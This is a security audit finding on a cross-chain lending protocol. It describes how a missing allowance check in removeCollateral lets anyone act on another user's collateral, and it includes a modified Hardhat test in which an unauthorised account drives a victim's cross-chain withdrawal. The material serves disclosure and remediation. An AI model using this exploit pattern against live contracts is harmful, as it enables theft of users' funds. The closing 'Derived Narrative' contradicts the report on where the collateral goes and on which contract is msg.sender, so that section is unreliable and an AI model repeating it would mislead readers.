---
id: 19086
severity: "High"
---

# `BaseTOFT.sol`: `removeCollateral` can be used to manipulate other user’s positions and steal tokens due to absent approval check

## Description

```solidity
The function `removeCollateral` is used to trigger a removal of collateral on a different chain. The function takes the parameter `from`, which is the account whose collateral will be sold. It also takes the parameter `to` where these collateral tokens will be transferred to.

The main issue is that anyone can call this function with any address passed to the `from` parameter. There is no allowance check on the chain, allowing this operation. Let’s walk through the steps to see how this is executed. Lets assume both `from` and `to` are the victim’s address for reasons explained at the end.

`BaseTOFT.sol`:`removeCollateral` is called by the attacker with a `from` and `to` address of the victim. This function calls the `removeCollateral` function in the market module.
    
     _executeModule(
        Module.Market,
        abi.encodeWithSelector(
            BaseTOFTMarketModule.removeCollateral.selector,
            from,
            to,
            lzDstChainId,
            zroPaymentAddress,
            withdrawParams,
            removeParams,
            approvals,
            adapterParams
        ),
        false
    );

`BaseTOFTMarketModule.sol`:`removeCollateral` is called. This function packs some data and sends it forward to the lz endpoint. Point to note, is that no approval check is done for the `msg.sender` of this whole setup yet.
    
    bytes memory lzPayload = abi.encode(
        PT_MARKET_REMOVE_COLLATERAL,
        from,
        to,
        toAddress,
        removeParams,
        withdrawParams,
        approvals
    );
    // lzsend(...)

After the message is sent, the **lzendpoint** on the receiving chain will call the TOFT contract again. Now, the `msg.sender` is **not** the attacker, but is instead the lzendpoint! The endpoint call gets delegated to the `remove` function in the Market module.
    
     (
        ,
        ,
        address to,
        ,
        ITapiocaOFT.IRemoveParams memory removeParams,
        ICommonData.IWithdrawParams memory withdrawParams,
        ICommonData.IApproval[] memory approvals
    ) = abi.decode(
            _payload,
            (
                uint16,
                address,
                address,
                bytes32,
                ITapiocaOFT.IRemoveParams,
                ICommonData.IWithdrawParams,
                ICommonData.IApproval[]
            )
        );

Here we see the unpacking. note that the third unpacked value is put in the `to` field. This is an address determined by the attacker and passed through the layerzero endpoints. The contract then calls a market contract’s `removeCollateral` function.
    
     IMarket(removeParams.market).removeCollateral(
        to,
        to,
        removeParams.share
    );

Thus it is evident from this call that the Market contract being called has no idea that the original sender was the attacker. Instead, for the Market contract, the `msg.sender` is the current TOFT contract. If users want to use the cross chain operations, they have to give allowance to the TOFT contract address. Thus we can assume that the victim has already given allowance to this address. Thus the market thinks the `msg.sender` is the TOFT contract, who is allowed, and thus executes the operations.

Thus we have demonstrated that the attacker is able to call a function on the victim’s market position **without** being given any allowance by setting the victim’s address in the `to` field. While it is a suspected bug that the `removeCollateral` removes collateral from the `to` field’s account and not the `from` field, since both these parameters are determined by the attacker, the bug exists either way. Thus this is a high severity issue since the victim’s collateral is withdrawn, dropping their health factor.
```

## Proof of Concept

A POC isnt provided since the test suite does not have a test for the `removeCollateral` function. However the function `retrieveFromStrategy` suffers from the same issue and has been addressed in a different report. The test for that function can be used to demonstrate this issue.

Two lines from the test in test/TapiocaOFT.test.ts is changed to show this issue. Below is the full test for reference. The changed bits are marked with arrows.
```solidity
it.only("should be able to deposit & withdraw from a strategy available on another layer", async () => {
    const {
        signer,
        erc20Mock,
        mintAndApprove,
        bigDummyAmount,
        utils,
        randomUser, // @audit <------------------------------------- take other user address
    } = await loadFixture(setupFixture)

    const LZEndpointMock_chainID_0 = await utils.deployLZEndpointMock(
        31337
    )
    const LZEndpointMock_chainID_10 = await utils.deployLZEndpointMock(
        10
    )

    const tapiocaWrapper_0 = await utils.deployTapiocaWrapper()
    const tapiocaWrapper_10 = await utils.deployTapiocaWrapper()

    //Deploy YB and Strategies
    const yieldBox0Data = await deployYieldBox(signer)
    const yieldBox10Data = await deployYieldBox(signer)

    const YieldBox_0 = yieldBox0Data.yieldBox
    const YieldBox_10 = yieldBox10Data.yieldBox

    {
        const txData =
            await tapiocaWrapper_0.populateTransaction.createTOFT(
                erc20Mock.address,
                (
                    await utils.Tx_deployTapiocaOFT(
                        LZEndpointMock_chainID_0.address,
                        erc20Mock.address,
                        YieldBox_0.address,
                        31337,
                        signer
                    )
                ).txData,
                ethers.utils.randomBytes(32),
                false
            )
        txData.gasLimit = await hre.ethers.provider.estimateGas(txData)
        await signer.sendTransaction(txData)
    }

    const tapiocaOFT0 = (await utils.attachTapiocaOFT(
        await tapiocaWrapper_0.tapiocaOFTs(
            (await tapiocaWrapper_0.tapiocaOFTLength()).sub(1)
        )
    )) as TapiocaOFT

    // Deploy TapiocaOFT10
    {
        const txData =
            await tapiocaWrapper_10.populateTransaction.createTOFT(
                erc20Mock.address,
                (
                    await utils.Tx_deployTapiocaOFT(
                        LZEndpointMock_chainID_10.address,
                        erc20Mock.address,
                        YieldBox_10.address,
                        10,
                        signer
                    )
                ).txData,
                ethers.utils.randomBytes(32),
                false
            )
        txData.gasLimit = await hre.ethers.provider.estimateGas(txData)
        await signer.sendTransaction(txData)
    }

    const tapiocaOFT10 = (await utils.attachTapiocaOFT(
        await tapiocaWrapper_10.tapiocaOFTs(
            (await tapiocaWrapper_10.tapiocaOFTLength()).sub(1)
        )
    )) as TapiocaOFT

    const strategy0Data = await deployToftMockStrategy(
        signer,
        YieldBox_0.address,
        tapiocaOFT0.address
    )
    const strategy10Data = await deployToftMockStrategy(
        signer,
        YieldBox_10.address,
        tapiocaOFT10.address
    )

    const Strategy_0 = strategy0Data.tOFTStrategyMock
    const Strategy_10 = strategy10Data.tOFTStrategyMock

    // Setup
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    // Set trusted remotes
    const dstChainId0 = 31337
    const dstChainId10 = 10

    await tapiocaWrapper_0.executeTOFT(
        tapiocaOFT0.address,
        tapiocaOFT0.interface.encodeFunctionData("setTrustedRemote", [
            dstChainId10,
            ethers.utils.solidityPack(
                ["address", "address"],
                [tapiocaOFT10.address, tapiocaOFT0.address]
            ),
        ]),
        true
    )

    await tapiocaWrapper_10.executeTOFT(
        tapiocaOFT10.address,
        tapiocaOFT10.interface.encodeFunctionData("setTrustedRemote", [
            dstChainId0,
            ethers.utils.solidityPack(
                ["address", "address"],
                [tapiocaOFT0.address, tapiocaOFT10.address]
            ),
        ]),
        true
    )
    // Link endpoints with addresses
    await LZEndpointMock_chainID_0.setDestLzEndpoint(
        tapiocaOFT10.address,
        LZEndpointMock_chainID_10.address
    )
    await LZEndpointMock_chainID_10.setDestLzEndpoint(
        tapiocaOFT0.address,
        LZEndpointMock_chainID_0.address
    )

    //Register tokens on YB
    await YieldBox_0.registerAsset(
        1,
        tapiocaOFT0.address,
        Strategy_0.address,
        0
    )
    await YieldBox_10.registerAsset(
        1,
        tapiocaOFT10.address,
        Strategy_10.address,
        0
    )

    const tapiocaOFT0Id = await YieldBox_0.ids(
        1,
        tapiocaOFT0.address,
        Strategy_0.address,
        0
    )
    const tapiocaOFT10Id = await YieldBox_10.ids(
        1,
        tapiocaOFT10.address,
        Strategy_10.address,
        0
    )

    expect(tapiocaOFT0Id.eq(1)).to.be.true
    expect(tapiocaOFT10Id.eq(1)).to.be.true

    //Test deposits on same chain
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    await tapiocaOFT0.approve(
        YieldBox_0.address,
        ethers.constants.MaxUint256
    )
    let toDepositShare = await YieldBox_0.toShare(
        tapiocaOFT0Id,
        bigDummyAmount,
        false
    )
    await YieldBox_0.depositAsset(
        tapiocaOFT0Id,
        signer.address,
        signer.address,
        0,
        toDepositShare
    )

    let yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    let vaultAmount = await Strategy_0.vaultAmount()
    expect(yb0Balance.gt(bigDummyAmount)).to.be.true //bc of the yield
    expect(vaultAmount.eq(bigDummyAmount)).to.be.true

    //Test withdraw on same chain
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )
    await tapiocaOFT0.transfer(
        Strategy_0.address,
        yb0Balance.sub(bigDummyAmount)
    ) //assures the strategy has enough tokens to withdraw
    const signerBalanceBeforeWithdraw = await tapiocaOFT0.balanceOf(
        signer.address
    )

    const toWithdrawShare = await YieldBox_0.balanceOf(
        signer.address,
        tapiocaOFT0Id
    )
    await YieldBox_0.withdraw(
        tapiocaOFT0Id,
        signer.address,
        signer.address,
        0,
        toWithdrawShare
    )
    const signerBalanceAfterWithdraw = await tapiocaOFT0.balanceOf(
        signer.address
    )

    expect(
        signerBalanceAfterWithdraw
            .sub(signerBalanceBeforeWithdraw)
            .gt(bigDummyAmount)
    ).to.be.true

    vaultAmount = await Strategy_0.vaultAmount()
    expect(vaultAmount.eq(0)).to.be.true

    yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    expect(vaultAmount.eq(0)).to.be.true

    const latestBalance = await Strategy_0.currentBalance()
    expect(latestBalance.eq(0)).to.be.true

    toDepositShare = await YieldBox_0.toShare(
        tapiocaOFT0Id,
        bigDummyAmount,
        false
    )

    const totals = await YieldBox_0.assetTotals(tapiocaOFT0Id)
    expect(totals[0].eq(0)).to.be.true
    expect(totals[1].eq(0)).to.be.true

    //Cross chain deposit from TapiocaOFT_10 to Strategy_0
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    await expect(
        tapiocaOFT0.sendFrom(
            signer.address,
            10,
            ethers.utils.defaultAbiCoder.encode(
                ["address"],
                [signer.address]
            ),
            bigDummyAmount,
            {
                refundAddress: signer.address,
                zroPaymentAddress: ethers.constants.AddressZero,
                adapterParams: "0x",
            },
            {
                value: ethers.utils.parseEther("0.02"),
                gasLimit: 2_000_000,
            }
        )
    ).to.not.be.reverted
    const signerBalanceForTOFT10 = await tapiocaOFT10.balanceOf(
        signer.address
    )
    expect(signerBalanceForTOFT10.eq(bigDummyAmount)).to.be.true

    const asset = await YieldBox_0.assets(tapiocaOFT0Id)
    expect(asset[2]).to.eq(Strategy_0.address)

    await tapiocaOFT10.sendToStrategy(
        signer.address,
        signer.address,
        bigDummyAmount,
        toDepositShare,
        1, //asset id
        dstChainId0,
        {
            extraGasLimit: "2500000",
            zroPaymentAddress: ethers.constants.AddressZero,
        },
        {
            value: ethers.utils.parseEther("15"),
        }
    )

    let strategy0Amount = await Strategy_0.vaultAmount()
    expect(strategy0Amount.gt(0)).to.be.true

    const yb0BalanceAfterCrossChainDeposit = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    expect(yb0BalanceAfterCrossChainDeposit.gt(bigDummyAmount))

    const airdropAdapterParams = ethers.utils.solidityPack(
        ["uint16", "uint", "uint", "address"],
        [2, 800000, ethers.utils.parseEther("2"), tapiocaOFT0.address]
    )

    await YieldBox_0.setApprovalForAsset(
        tapiocaOFT0.address,
        tapiocaOFT0Id,
        true
    ) //this should be done through Magnetar in the same tx, to avoid frontrunning

    yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )

    await tapiocaOFT0.transfer(
        Strategy_0.address,
        yb0Balance.sub(bigDummyAmount)
    ) //assures the strategy has enough tokens to withdraw

    await hre.ethers.provider.send("hardhat_setBalance", [
        randomUser.address,
        ethers.utils.hexStripZeros(
            ethers.utils.parseEther(String(20))._hex
        ),
    ]) // @audit <------------------------------------------- Fund user
    await tapiocaOFT10
        .connect(randomUser) // @audit <------------------------------------------- Call with other user instead of signer
        .retrieveFromStrategy(
            signer.address,
            yb0BalanceAfterCrossChainDeposit,
            toWithdrawShare,
            1,
            dstChainId0,
            ethers.constants.AddressZero,
            airdropAdapterParams,
            {
                value: ethers.utils.parseEther("10"),
            }
        )
    strategy0Amount = await Strategy_0.vaultAmount()
    expect(strategy0Amount.eq(0)).to.be.true

    const signerBalanceAfterCrossChainWithdrawal =
        await tapiocaOFT10.balanceOf(signer.address)
    expect(signerBalanceAfterCrossChainWithdrawal.gt(bigDummyAmount)).to
        .be.true
})
```
The only relevant change is that the function `retrieveFromStrategy` is called from another address. The test passes, showing that an attacker, in this case `randomUser` can influence the operations of the victim, the `signer`.

## Recommendation

Add an allowance check for the `msg.sender` in the `removeCollateral` function.

This attack can be summed up as “approvals are not checked when operating cross-chain.” There are several instances of this bug with varying levels of severity all reported by warden carrotsmuggler. Because they all use the same attack vector and all perform undesired/unrequested acts on behalf of other users, I have grouped them and rated this issue as high risk.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in a cross‑chain collateral removal function that does not verify that the caller is authorized to act on the specified account. The function accepts a `from` address (the account whose collateral should be taken) and a `to` address (the destination for the withdrawn tokens) but fails to check that the transaction initiator has an allowance for the `from` account. Because the call is forwarded through a LayerZero endpoint, the `msg.sender` seen by the market contract is the endpoint contract, not the original attacker. The market contract therefore assumes the call originates from the trusted TOFT contract, which the victim has previously approved for cross‑chain operations. An attacker can therefore invoke the function with the victim’s address in both `from` and `to`, causing the market contract to transfer the victim’s collateral to an address controlled by the attacker. This manipulation works whenever a user has granted the TOFT contract allowance to manage their collateral, which is a normal prerequisite for legitimate cross‑chain actions. The root cause is the absence of an allowance or ownership check on the `from` parameter and the reliance on the endpoint’s `msg.sender` for authorization. Exploitation proceeds as follows: (1) the attacker calls `removeCollateral` on the TOFT contract, supplying the victim’s address as both source and destination; (2) the call is encoded and sent through the LayerZero endpoint; (3) on the destination chain the endpoint invokes the TOFT contract, which then forwards the request to the market module; (4) the market module calls its own `removeCollateral` with the attacker‑chosen `to` address, believing the TOFT contract is authorized; (5) the market contract transfers the victim’s collateral to the attacker, reducing the victim’s health factor and potentially triggering liquidation. From a user’s perspective the symptoms are a sudden loss of collateral balance, a health factor drop, and the appearance that no withdrawal was requested. The issue was discovered during a security audit that examined cross‑chain functions and noticed that a similar function (`retrieveFromStrategy`) could be called by an arbitrary address to affect another user’s position. The bug is subtle because the call chain masks the original caller, making the unauthorized action look like a legitimate cross‑chain operation. To remediate, the contract should enforce that the caller is either the owner of the `from` address or that an explicit signature authorizes the operation, and it must perform an allowance check against the `from` account before proceeding with any token transfer. In broader terms, this is an authorization bypass in a cross‑chain asset management function, allowing an attacker to steal tokens by manipulating unchecked address parameters.
